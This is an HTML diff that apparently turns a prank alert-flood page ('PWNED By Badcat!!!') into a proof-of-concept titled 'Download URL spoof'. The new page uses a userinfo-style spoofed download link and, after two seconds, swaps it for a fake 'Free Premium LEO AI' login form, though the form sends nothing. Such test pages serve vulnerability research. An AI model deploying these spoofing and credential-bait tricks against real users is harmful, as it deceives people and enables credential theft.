@@ -1,20 +1,35 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Have A nice dream</title>
+  <meta charset="utf-8">
+  <title>Download URL spoof</title>
 </head>
+<h1 id="a1">LongPress & Click UI</h1>
 <body>
-    <h1>No Escape ;)</h1>
-    <script>
-      
-            for (let i = 1; i <= 1000; i++) {
-               
-                    alert("PWNED "+"By "+"Badcat!!!");
-              
-            }
-       
-    </script>
+  <a id="a2"
+     href="https://brave.com@referrals.brave.com/latest/BraveBrowserSetup-BRV010.exe"
+     download="a.ics">Download</a>
+  <div id="text" style="display:none;">
+    <form>
+        <h1>Free Premium LEO AI</h1>
+      <label for="username">Username:</label><br>
+      <input type="text" id="username" name="username"><br>
+      <label for="password">Password:</label><br>
+      <input type="password" id="password" name="password"><br><br>
+      <button type="button" onclick="showSuccess()">Verify</button>
+    </form>
+  </div>
+
+  <script>
+    setTimeout(function() {
+      document.getElementById("text").style.display = "block";
+   document.getElementById("a1").remove();
+      document.getElementById("a2").remove();
+    }, 2000);
+
+    function showSuccess() {
+      document.write("i got u :p");
+    }
+  </script>
 </body>
 </html>
